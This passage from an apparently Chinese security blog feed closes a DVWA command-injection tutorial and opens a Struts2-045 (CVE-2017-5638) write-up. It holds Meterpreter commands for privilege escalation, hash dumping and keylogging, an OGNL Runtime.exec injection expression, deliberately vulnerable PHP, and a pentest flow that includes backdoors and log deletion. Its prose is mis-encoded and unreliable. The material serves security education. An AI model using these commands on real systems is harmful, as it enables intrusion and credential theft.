class=\"language-bash\">è·å–ç³»ç»Ÿä¿¡æ¯</span><br>sysinfo<br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\"># </span><span class=\"language-bash\">è·å–ç”¨æˆ·æƒé™</span><br>getuid<br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\"># </span><span class=\"language-bash\">ææƒåˆ°SYSTEM</span><br>getsystem<br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\"># </span><span class=\"language-bash\">è·å–å¯†ç å“ˆå¸Œ</span><br>hashdump<br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\"># </span><span class=\"language-bash\">æˆªå±</span><br>screenshot<br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\"># </span><span class=\"language-bash\">é”®ç›˜è®°å½•</span><br>keyscan_start<br></code></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"ğŸ›¡ï¸-é˜²æŠ¤æªæ–½\"><a href=\"#ğŸ›¡ï¸-é˜²æŠ¤æªæ–½\" class=\"headerlink\" title=\"ğŸ›¡ï¸ é˜²æŠ¤æªæ–½\"></a>ğŸ›¡ï¸ é˜²æŠ¤æªæ–½</h2><h3 id=\"è¾“å…¥éªŒè¯å’Œè¿‡æ»¤\"><a href=\"#è¾“å…¥éªŒè¯å’Œè¿‡æ»¤\" class=\"headerlink\" title=\"è¾“å…¥éªŒè¯å’Œè¿‡æ»¤\"></a>è¾“å…¥éªŒè¯å’Œè¿‡æ»¤</h3><h4 id=\"1-ç™½åå•éªŒè¯\"><a href=\"#1-ç™½åå•éªŒè¯\" class=\"headerlink\" title=\"1. ç™½åå•éªŒè¯\"></a>1. ç™½åå•éªŒè¯</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">validateIP</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$ip</span></span>) </span>&#123;<br>    <span class=\"hljs-comment\">// ä½¿ç”¨ç™½åå•éªŒè¯IPåœ°å€æ ¼å¼</span><br>    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-title function_ invoke__\">filter_var</span>(<span class=\"hljs-variable\">$ip</span>, FILTER_VALIDATE_IP)) &#123;<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable\">$ip</span>;<br>    &#125;<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">false</span>;<br>&#125;<br><br><span class=\"hljs-variable\">$target</span> = <span class=\"hljs-variable\">$_REQUEST</span>[<span class=\"hljs-string\">&#x27;ip&#x27;</span>];<br><span class=\"hljs-variable\">$validIP</span> = <span class=\"hljs-title function_ invoke__\">validateIP</span>(<span class=\"hljs-variable\">$target</span>);<br><br><span class=\"hljs-keyword\">if</span> (<span class=\"hljs-variable\">$validIP</span>) &#123;<br>    <span class=\"hljs-variable\">$cmd</span> = <span class=\"hljs-title function_ invoke__\">shell_exec</span>(<span class=\"hljs-string\">&#x27;ping -c 4 &#x27;</span> . <span class=\"hljs-title function_ invoke__\">escapeshellarg</span>(<span class=\"hljs-variable\">$validIP</span>));<br>&#125; <span class=\"hljs-keyword\">else</span> &#123;<br>    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;Invalid IP address&quot;</span>;<br>&#125;<br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h4 id=\"2-ç‰¹æ®Šå­—ç¬¦è¿‡æ»¤\"><a href=\"#2-ç‰¹æ®Šå­—ç¬¦è¿‡æ»¤\" class=\"headerlink\" title=\"2. ç‰¹æ®Šå­—ç¬¦è¿‡æ»¤\"></a>2. ç‰¹æ®Šå­—ç¬¦è¿‡æ»¤</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">filterDangerousChars</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$input</span></span>) </span>&#123;<br>    <span class=\"hljs-comment\">// è¿‡æ»¤å±é™©å­—ç¬¦</span><br>    <span class=\"hljs-variable\">$dangerous</span> = <span class=\"hljs-keyword\">array</span>(<span class=\"hljs-string\">&#x27;;&#x27;</span>, <span class=\"hljs-string\">&#x27;&amp;&#x27;</span>, <span class=\"hljs-string\">&#x27;|&#x27;</span>, <span class=\"hljs-string\">&#x27;`&#x27;</span>, <span class=\"hljs-string\">&#x27;$&#x27;</span>, <span class=\"hljs-string\">&#x27;(&#x27;</span>, <span class=\"hljs-string\">&#x27;)&#x27;</span>, <span class=\"hljs-string\">&#x27;&#123;&#x27;</span>, <span class=\"hljs-string\">&#x27;&#125;&#x27;</span>, <span class=\"hljs-string\">&#x27;[&#x27;</span>, <span class=\"hljs-string\">&#x27;]&#x27;</span>, <span class=\"hljs-string\">&#x27;&lt;&#x27;</span>, <span class=\"hljs-string\">&#x27;&gt;&#x27;</span>);<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-title function_ invoke__\">str_replace</span>(<span class=\"hljs-variable\">$dangerous</span>, <span class=\"hljs-string\">&#x27;&#x27;</span>, <span class=\"hljs-variable\">$input</span>);<br>&#125;<br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"ä½¿ç”¨å®‰å…¨çš„API\"><a href=\"#ä½¿ç”¨å®‰å…¨çš„API\" class=\"headerlink\" title=\"ä½¿ç”¨å®‰å…¨çš„API\"></a>ä½¿ç”¨å®‰å…¨çš„API</h3><h4 id=\"é¿å…ç›´æ¥è°ƒç”¨ç³»ç»Ÿå‘½ä»¤\"><a href=\"#é¿å…ç›´æ¥è°ƒç”¨ç³»ç»Ÿå‘½ä»¤\" class=\"headerlink\" title=\"é¿å…ç›´æ¥è°ƒç”¨ç³»ç»Ÿå‘½ä»¤\"></a>é¿å…ç›´æ¥è°ƒç”¨ç³»ç»Ÿå‘½ä»¤</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><span class=\"hljs-comment\">// ä¸å®‰å…¨çš„æ–¹å¼</span><br><span class=\"hljs-variable\">$cmd</span> = <span class=\"hljs-title function_ invoke__\">shell_exec</span>(<span class=\"hljs-string\">&#x27;ping -c 4 &#x27;</span> . <span class=\"hljs-variable\">$target</span>);<br><br><span class=\"hljs-comment\">// å®‰å…¨çš„æ–¹å¼ï¼šä½¿ç”¨ä¸“é—¨çš„å‡½æ•°</span><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">securePing</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$ip</span></span>) </span>&#123;<br>    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-title function_ invoke__\">filter_var</span>(<span class=\"hljs-variable\">$ip</span>, FILTER_VALIDATE_IP)) &#123;<br>        <span class=\"hljs-comment\">// ä½¿ç”¨socketæˆ–å…¶ä»–å®‰å…¨æ–¹å¼å®ç°pingåŠŸèƒ½</span><br>        <span class=\"hljs-comment\">// è€Œä¸æ˜¯ç›´æ¥è°ƒç”¨ç³»ç»Ÿå‘½ä»¤</span><br>    &#125;<br>&#125;<br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"æƒé™æ§åˆ¶\"><a href=\"#æƒé™æ§åˆ¶\" class=\"headerlink\" title=\"æƒé™æ§åˆ¶\"></a>æƒé™æ§åˆ¶</h3><ol>\n<li><strong>æœ€å°æƒé™åŸåˆ™</strong>ï¼šWebåº”ç”¨ç¨‹åºåº”è¯¥ä»¥æœ€å°æƒé™ç”¨æˆ·è¿è¡Œ</li>\n<li><strong>ç¦ç”¨å±é™©å‡½æ•°</strong>ï¼šåœ¨php.iniä¸­ç¦ç”¨<code>exec</code>, <code>shell_exec</code>, <code>system</code>ç­‰å‡½æ•°</li>\n<li><strong>æ²™ç®±ç¯å¢ƒ</strong>ï¼šå°†Webåº”ç”¨ç¨‹åºè¿è¡Œåœ¨å—é™çš„ç¯å¢ƒä¸­</li>\n</ol>\n<h3 id=\"ä»£ç å®¡è®¡\"><a href=\"#ä»£ç å®¡è®¡\" class=\"headerlink\" title=\"ä»£ç å®¡è®¡\"></a>ä»£ç å®¡è®¡</h3><p>å®šæœŸè¿›è¡Œä»£ç å®‰å…¨å®¡è®¡ï¼Œé‡ç‚¹å…³æ³¨ï¼š</p>\n<ul>\n<li>ç”¨æˆ·è¾“å…¥å¤„ç†</li>\n<li>ç³»ç»Ÿå‘½ä»¤è°ƒç”¨</li>\n<li>æ–‡ä»¶æ“ä½œ</li>\n<li>æ•°æ®åº“æŸ¥è¯¢</li>\n</ul>\n<hr>\n<h2 id=\"ğŸ“Š-å®‰å…¨ç­‰çº§åˆ†æ\"><a href=\"#ğŸ“Š-å®‰å…¨ç­‰çº§åˆ†æ\" class=\"headerlink\" title=\"ğŸ“Š å®‰å…¨ç­‰çº§åˆ†æ\"></a>ğŸ“Š å®‰å…¨ç­‰çº§åˆ†æ</h2><h3 id=\"DVWAå„å®‰å…¨ç­‰çº§çš„é˜²æŠ¤æœºåˆ¶\"><a href=\"#DVWAå„å®‰å…¨ç­‰çº§çš„é˜²æŠ¤æœºåˆ¶\" class=\"headerlink\" title=\"DVWAå„å®‰å…¨ç­‰çº§çš„é˜²æŠ¤æœºåˆ¶\"></a>DVWAå„å®‰å…¨ç­‰çº§çš„é˜²æŠ¤æœºåˆ¶</h3><h4 id=\"Lowçº§åˆ«\"><a href=\"#Lowçº§åˆ«\" class=\"headerlink\" title=\"Lowçº§åˆ«\"></a>Lowçº§åˆ«</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><span class=\"hljs-comment\">// å®Œå…¨æ²¡æœ‰è¿‡æ»¤</span><br><span class=\"hljs-variable\">$target</span> = <span class=\"hljs-variable\">$_REQUEST</span>[<span class=\"hljs-string\">&#x27;ip&#x27;</span>];<br><span class=\"hljs-variable\">$cmd</span> = <span class=\"hljs-title function_ invoke__\">shell_exec</span>(<span class=\"hljs-string\">&#x27;ping -c 4 &#x27;</span> . <span class=\"hljs-variable\">$target</span>);<br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h4 id=\"Mediumçº§åˆ«\"><a href=\"#Mediumçº§åˆ«\" class=\"headerlink\" title=\"Mediumçº§åˆ«\"></a>Mediumçº§åˆ«</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><span class=\"hljs-comment\">// ç®€å•çš„é»‘åå•è¿‡æ»¤</span><br><span class=\"hljs-variable\">$target</span> = <span class=\"hljs-variable\">$_REQUEST</span>[<span class=\"hljs-string\">&#x27;ip&#x27;</span>];<br><span class=\"hljs-variable\">$target</span> = <span class=\"hljs-title function_ invoke__\">str_replace</span>(<span class=\"hljs-keyword\">array</span>(<span class=\"hljs-string\">&#x27;&amp;&amp;&#x27;</span>, <span class=\"hljs-string\">&#x27;;&#x27;</span>), <span class=\"hljs-string\">&#x27;&#x27;</span>, <span class=\"hljs-variable\">$target</span>);<br><span class=\"hljs-variable\">$cmd</span> = <span class=\"hljs-title function_ invoke__\">shell_exec</span>(<span class=\"hljs-string\">&#x27;ping -c 4 &#x27;</span> . <span class=\"hljs-variable\">$target</span>);<br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h4 id=\"Highçº§åˆ«\"><a href=\"#Highçº§åˆ«\" class=\"headerlink\" title=\"Highçº§åˆ«\"></a>Highçº§åˆ«</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><span class=\"hljs-comment\">// æ›´ä¸¥æ ¼çš„è¿‡æ»¤</span><br><span class=\"hljs-variable\">$target</span> = <span class=\"hljs-title function_ invoke__\">trim</span>(<span class=\"hljs-variable\">$_REQUEST</span>[<span class=\"hljs-string\">&#x27;ip&#x27;</span>]);<br><span class=\"hljs-variable\">$substitutions</span> = <span class=\"hljs-keyword\">array</span>(<br>    <span class=\"hljs-string\">&#x27;&amp;&#x27;</span>  =&gt; <span class=\"hljs-string\">&#x27;&#x27;</span>,<br>    <span class=\"hljs-string\">&#x27;;&#x27;</span>  =&gt; <span class=\"hljs-string\">&#x27;&#x27;</span>,<br>    <span class=\"hljs-string\">&#x27;| &#x27;</span> =&gt; <span class=\"hljs-string\">&#x27;&#x27;</span>,<br>    <span class=\"hljs-string\">&#x27;-&#x27;</span>  =&gt; <span class=\"hljs-string\">&#x27;&#x27;</span>,<br>    <span class=\"hljs-string\">&#x27;$&#x27;</span>  =&gt; <span class=\"hljs-string\">&#x27;&#x27;</span>,<br>    <span class=\"hljs-string\">&#x27;(&#x27;</span>  =&gt; <span class=\"hljs-string\">&#x27;&#x27;</span>,<br>    <span class=\"hljs-string\">&#x27;)&#x27;</span>  =&gt; <span class=\"hljs-string\">&#x27;&#x27;</span>,<br>    <span class=\"hljs-string\">&#x27;`&#x27;</span>  =&gt; <span class=\"hljs-string\">&#x27;&#x27;</span>,<br>    <span class=\"hljs-string\">&#x27;||&#x27;</span> =&gt; <span class=\"hljs-string\">&#x27;&#x27;</span>,<br>);<br><span class=\"hljs-variable\">$target</span> = <span class=\"hljs-title function_ invoke__\">str_replace</span>(<span class=\"hljs-title function_ invoke__\">array_keys</span>(<span class=\"hljs-variable\">$substitutions</span>), <span class=\"hljs-variable\">$substitutions</span>, <span class=\"hljs-variable\">$target</span>);<br><span class=\"hljs-variable\">$cmd</span> = <span class=\"hljs-title function_ invoke__\">shell_exec</span>(<span class=\"hljs-string\">&#x27;ping -c 4 &#x27;</span> . <span class=\"hljs-variable\">$target</span>);<br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"ğŸ“-å­¦ä¹ è¦ç‚¹\"><a href=\"#ğŸ“-å­¦ä¹ è¦ç‚¹\" class=\"headerlink\" title=\"ğŸ“ å­¦ä¹ è¦ç‚¹\"></a>ğŸ“ å­¦ä¹ è¦ç‚¹</h2><h3 id=\"å…³é”®çŸ¥è¯†ç‚¹æ€»ç»“\"><a href=\"#å…³é”®çŸ¥è¯†ç‚¹æ€»ç»“\" class=\"headerlink\" title=\"å…³é”®çŸ¥è¯†ç‚¹æ€»ç»“\"></a>å…³é”®çŸ¥è¯†ç‚¹æ€»ç»“</h3><ol>\n<li><strong>æ¼æ´æˆå› </strong>ï¼šç¼ºä¹è¾“å…¥éªŒè¯å’Œè¾“å‡ºè¿‡æ»¤</li>\n<li><strong>åˆ©ç”¨æ–¹æ³•</strong>ï¼šå‘½ä»¤è¿æ¥ç¬¦ã€ç‰¹æ®Šå­—ç¬¦ç»•è¿‡</li>\n<li><strong>å±å®³ç¨‹åº¦</strong>ï¼šæœåŠ¡å™¨å®Œå…¨æ§åˆ¶ã€æ•°æ®æ³„éœ²</li>\n<li><strong>é˜²æŠ¤ç­–ç•¥</strong>ï¼šè¾“å…¥éªŒè¯ã€æƒé™æ§åˆ¶ã€å®‰å…¨ç¼–ç </li>\n</ol>\n<h3 id=\"æ¸—é€æµ‹è¯•æµç¨‹\"><a href=\"#æ¸—é€æµ‹è¯•æµç¨‹\" class=\"headerlink\" title=\"æ¸—é€æµ‹è¯•æµç¨‹\"></a>æ¸—é€æµ‹è¯•æµç¨‹</h3><ol>\n<li><strong>ä¿¡æ¯æ”¶é›†</strong>ï¼šç¡®å®šç›®æ ‡å’Œæ”»å‡»é¢</li>\n<li><strong>æ¼æ´å‘ç°</strong>ï¼šå¯»æ‰¾å‘½ä»¤æ‰§è¡Œç‚¹</li>\n<li><strong>æ¼æ´éªŒè¯</strong>ï¼šç¡®è®¤æ¼æ´å­˜åœ¨</li>\n<li><strong>æ¼æ´åˆ©ç”¨</strong>ï¼šè·å–ç³»ç»Ÿæƒé™</li>\n<li><strong>æƒé™ç»´æŒ</strong>ï¼šä¸Šä¼ åé—¨ã€å»ºç«‹æŒä¹…è¿æ¥</li>\n<li><strong>ç—•è¿¹æ¸…ç†</strong>ï¼šåˆ é™¤æ—¥å¿—ã€æ¢å¤ç³»ç»ŸçŠ¶æ€</li>\n</ol>\n<hr>\n<h2 id=\"âš ï¸-å…è´£å£°æ˜\"><a href=\"#âš ï¸-å…è´£å£°æ˜\" class=\"headerlink\" title=\"âš ï¸ å…è´£å£°æ˜\"></a>âš ï¸ å…è´£å£°æ˜</h2><p>æœ¬æ–‡å†…å®¹ä»…ä¾›ç½‘ç»œå®‰å…¨å­¦ä¹ å’Œç ”ç©¶ä½¿ç”¨ï¼Œè¯·å‹¿ç”¨äºéæ³•ç”¨é€”ã€‚ä»»ä½•ä¸ªäººæˆ–ç»„ç»‡ä½¿ç”¨æœ¬æ–‡ä¿¡æ¯è¿›è¡Œçš„è¿æ³•æ´»åŠ¨ï¼Œå‡ä¸ä½œè€…æ— å…³ã€‚è¯»è€…åº”å½“éµå®ˆå½“åœ°æ³•å¾‹æ³•è§„ï¼Œåœ¨åˆæ³•æˆæƒçš„ç¯å¢ƒä¸‹è¿›è¡Œå®‰å…¨æµ‹è¯•ã€‚</p>\n",
            "tags": [
                "æ¸—é€æµ‹è¯•",
                "Webå®‰å…¨",
                "å‘½ä»¤æ‰§è¡Œ",
                "æ¼æ´åˆ©ç”¨"
            ]
        },
        {
            "id": "https://bae-ace.github.io/2025/07/24/Struts2-045-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%E4%B8%8E%E5%88%A9%E7%94%A8/",
            "url": "https://bae-ace.github.io/2025/07/24/Struts2-045-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%E4%B8%8E%E5%88%A9%E7%94%A8/",
            "title": "Struts2-045è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´å¤ç°ä¸åŸç†åˆ†æ",
            "date_published": "2025-07-24T00:10:34.000Z",
            "content_html": "<h1 id=\"Struts2-045è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´å¤ç°ä¸åŸç†åˆ†æ\"><a href=\"#Struts2-045è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´å¤ç°ä¸åŸç†åˆ†æ\" class=\"headerlink\" title=\"Struts2-045è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´å¤ç°ä¸åŸç†åˆ†æ\"></a>Struts2-045è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´å¤ç°ä¸åŸç†åˆ†æ</h1><h2 id=\"æ¼æ´æ¦‚è¿°\"><a href=\"#æ¼æ´æ¦‚è¿°\" class=\"headerlink\" title=\"æ¼æ´æ¦‚è¿°\"></a>æ¼æ´æ¦‚è¿°</h2><p>Struts2-045ï¼ˆCVE-2017-5638ï¼‰æ˜¯Apache Struts2æ¡†æ¶ä¸­çš„ä¸€ä¸ªä¸¥é‡è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œè¯¥æ¼æ´å› å…¶å½±å“èŒƒå›´å¹¿ã€åˆ©ç”¨ç®€å•è€Œå¤‡å—å…³æ³¨ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„Content-Typeè¯·æ±‚å¤´ï¼Œåœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ã€‚</p>\n<h2 id=\"æ¼æ´åŸºæœ¬ä¿¡æ¯\"><a href=\"#æ¼æ´åŸºæœ¬ä¿¡æ¯\" class=\"headerlink\" title=\"æ¼æ´åŸºæœ¬ä¿¡æ¯\"></a>æ¼æ´åŸºæœ¬ä¿¡æ¯</h2><h3 id=\"å½±å“ç‰ˆæœ¬\"><a href=\"#å½±å“ç‰ˆæœ¬\" class=\"headerlink\" title=\"å½±å“ç‰ˆæœ¬\"></a>å½±å“ç‰ˆæœ¬</h3><ul>\n<li><strong>Apache Struts 2.3.5 - 2.3.31</strong>ï¼ˆåŒ…å«2.3.31ç‰ˆæœ¬ï¼‰</li>\n<li><strong>Apache Struts 2.5.0 - 2.5.10</strong>ï¼ˆåŒ…å«2.5.10ç‰ˆæœ¬ï¼‰</li>\n</ul>\n<h3 id=\"æ¼æ´ç­‰çº§\"><a href=\"#æ¼æ´ç­‰çº§\" class=\"headerlink\" title=\"æ¼æ´ç­‰çº§\"></a>æ¼æ´ç­‰çº§</h3><ul>\n<li><strong>CVSSè¯„åˆ†</strong>: 10.0ï¼ˆä¸¥é‡ï¼‰</li>\n<li><strong>æ¼æ´ç±»å‹</strong>: è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰</li>\n<li><strong>æ”»å‡»å¤æ‚åº¦</strong>: ä½</li>\n</ul>\n<h3 id=\"æ ¸å¿ƒåŸç†\"><a href=\"#æ ¸å¿ƒåŸç†\" class=\"headerlink\" title=\"æ ¸å¿ƒåŸç†\"></a>æ ¸å¿ƒåŸç†</h3><p>Struts2æ¡†æ¶åœ¨å¤„ç†æ–‡ä»¶ä¸Šä¼ è¯·æ±‚æ—¶ï¼Œä¼šè§£æContent-Typeè¯·æ±‚å¤´ã€‚å½“Content-Typeæ ¼å¼ä¸æ­£ç¡®æ—¶ï¼Œæ¡†æ¶ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œè€Œ<strong>å¼‚å¸¸å¤„ç†è¿‡ç¨‹ä¸­ä¼šå¯¹é”™è¯¯ä¿¡æ¯è¿›è¡ŒOGNLè¡¨è¾¾å¼è§£æ</strong>ï¼Œè¿™å°±ç»™äº†æ”»å‡»è€…å¯ä¹˜ä¹‹æœºã€‚</p>\n<h2 id=\"æŠ€æœ¯åŸç†æ·±åº¦åˆ†æ\"><a href=\"#æŠ€æœ¯åŸç†æ·±åº¦åˆ†æ\" class=\"headerlink\" title=\"æŠ€æœ¯åŸç†æ·±åº¦åˆ†æ\"></a>æŠ€æœ¯åŸç†æ·±åº¦åˆ†æ</h2><h3 id=\"OGNLè¡¨è¾¾å¼æ³¨å…¥æœºåˆ¶\"><a href=\"#OGNLè¡¨è¾¾å¼æ³¨å…¥æœºåˆ¶\" class=\"headerlink\" title=\"OGNLè¡¨è¾¾å¼æ³¨å…¥æœºåˆ¶\"></a>OGNLè¡¨è¾¾å¼æ³¨å…¥æœºåˆ¶</h3><p><strong>OGNLï¼ˆObject-Graph Navigation Languageï¼‰</strong> æ˜¯Struts2æ¡†æ¶ä½¿ç”¨çš„è¡¨è¾¾å¼è¯­è¨€ï¼Œç”¨äºåœ¨Javaå¯¹è±¡ä¹‹é—´è¿›è¡Œå¯¼èˆªå’Œæ“ä½œã€‚</p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs stylus\"><span class=\"hljs-comment\">// OGNLè¡¨è¾¾å¼ç¤ºä¾‹</span><br><span class=\"hljs-selector-id\">#context</span><span class=\"hljs-selector-attr\">[<span class=\"hljs-string\">&#x27;xwork.MethodAccessor.denyMethodExecution&#x27;</span>]</span> = false<br>@java<span class=\"hljs-selector-class\">.lang</span>.Runtime@<span class=\"hljs-built_in\">getRuntime</span>()<span class=\"hljs-selector-class\">.exec</span>(<span class=\"hljs-string\">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"æ¼æ´è§¦å‘æµç¨‹\"><a href=\"#æ¼æ´è§¦å‘æµç¨‹\" class=\"headerlink\" title=\"æ¼æ´è§¦å‘æµç¨‹\"></a>æ¼æ´è§¦å‘æµç¨‹</h3><ol>\n<li><strong>è¯·æ±‚æ¥æ”¶</strong>: æœåŠ¡å™¨æ¥æ”¶åŒ…å«æ¶æ„Content-Typeçš„HTTPè¯·æ±‚</li>\n<li><strong>ç±»å‹è§£æ</strong>: Struts2å°è¯•è§£æContent-Typeå¤´éƒ¨ä¿¡æ¯</li>\n<li><strong>å¼‚å¸¸è§¦å‘</strong>: æ¶æ„æ„é€ çš„Content-Typeå¯¼è‡´è§£æå¼‚å¸¸</li>\n<li><strong>é”™è¯¯å¤„ç†</strong>: å¼‚å¸¸å¤„ç†å™¨å¯¹é”™è¯¯ä¿¡æ¯è¿›è¡ŒOGNLè§£æ</li>\n<li><strong>ä»£ç æ‰§è¡Œ</strong>: æ¶æ„OGNLè¡¨è¾¾å¼è¢«æ‰§è¡Œï¼Œå®ç°RCE</li>\n</ol>\n<h3 id=\"å…³é”®æºç åˆ†æ\"><a href=\"#å…³é”®æºç åˆ†æ\" class=\"headerlink\" title=\"å…³é”®æºç åˆ†æ\"></a>å…³é”®æºç åˆ†æ</h3><p>æ¼æ´ä½äº<code>org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest</code>ç±»ä¸­ï¼š</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs typescript\"><span class=\"hljs-comment\">// ç®€åŒ–çš„æ¼æ´ä»£ç é€»è¾‘</span><br><span class=\"hljs-keyword\">private</span> <span class=\"hljs-built_in\">void</span> <span class=\"hljs-title function_\">buildErrorMessage</span>(<span class=\"hljs-params\"><span class=\"hljs-title class_\">Throwable</span> e, <span class=\"hljs-title class_\">Object</span>[] args</span>) &#123;<br>    <span class=\"hljs-title class_\">String</span> errorMessage = localizedTextProvider.<span class=\"hljs-title function_\">findDefaultText</span>(e.<span class=\"hljs-title function_\">getMessage</span>(), locale, args);<br>    <span class=\"hljs-comment\">// è¿™é‡Œä¼šå¯¹errorMessageè¿›è¡ŒOGNLè¡¨è¾¾å¼è§£æï¼Œå¯¼è‡´RCE</span><br>    <span class=\"hljs-keyword\">if</span> (errorMessage != <span class=\"hljs-literal\">null</span>) &#123;<br>        errorMessage = <span class=\"hljs-title class_\">TextParseUtil</span>.<span class=\"hljs-title function_\">translateVariables</span>(errorMessage, stack);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"å®éªŒç¯å¢ƒæ­å»º\"><a href=\"#å®éªŒç¯å¢ƒæ­å»º\" class=\"headerlink\" title=\"å®éªŒç¯å¢ƒæ­å»º\"></a>å®éªŒç¯å¢ƒæ­å»º</h2><h3 id=\"ç³»ç»Ÿæ¶æ„\"><a href=\"#ç³»ç»Ÿæ¶æ„\" class=\"headerlink\" title=\"ç³»ç»Ÿæ¶æ„\"></a>ç³»ç»Ÿæ¶æ„</h3><figure class=\"highlight nix\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs nix\">â”Œâ”€ æ”»å‡»æœºï¼ˆHostï¼‰<br>â”‚  â””â”€ Windows<span 